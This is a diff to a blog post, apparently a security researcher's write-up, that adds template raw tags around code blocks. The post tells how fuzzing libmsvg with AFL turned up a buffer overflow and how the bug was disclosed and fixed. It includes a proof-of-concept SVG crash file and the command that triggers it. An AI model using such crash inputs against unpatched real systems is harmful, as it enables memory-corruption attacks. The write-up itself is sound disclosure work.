@@ -11,6 +11,7 @@ Just compile the library with afl-clang-fast and then compile the tcook program 
 
 After a bit of fuzzing, I found a couple of interesting crashes. I found a boring null pointer dereference and then later on I found a very interesting buffer overflow:
 
+{% raw %}
 ```
 
 ===== Normalize gradients to SVG Tiny 1.2
@@ -571,9 +572,11 @@ all_crashes/id:000074,sig:06,src:006265,time:9942440,execs:8964036,op:havoc,rep:
 
 
 ```
+{% endraw %}
 
 After manually reviewing the code, the bug becomes quite obvious:
 
+{% raw %}
 ```
 
 static void addColorExtRawAttr(MsvgElement *el, char *key, rgbcolor color, char *iri)
@@ -594,12 +597,15 @@ static void addColorExtRawAttr(MsvgElement *el, char *key, rgbcolor color, char 
 }
 
 ```
+{% endraw %}
 
 and here is the proof of concept exploit for this bug:
 
+{% raw %}
 ```
 <svg><rect fill="url(#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)"/></svg>
 ```
+{% endraw %}
 
 just paste that into a file called crash.svg and then call `./tcook -w -utc -ng crash.svg` and observe the ASAN report. I reported this buffer overflow to the package maintainer and the bug was promptly fixed in commit 9b84f82044c405709194092a8db567a7d68f4b8a as you can see here: https://github.com/malfer/libmsvg/commit/9b84f82044c405709194092a8db567a7d68f4b8a
 
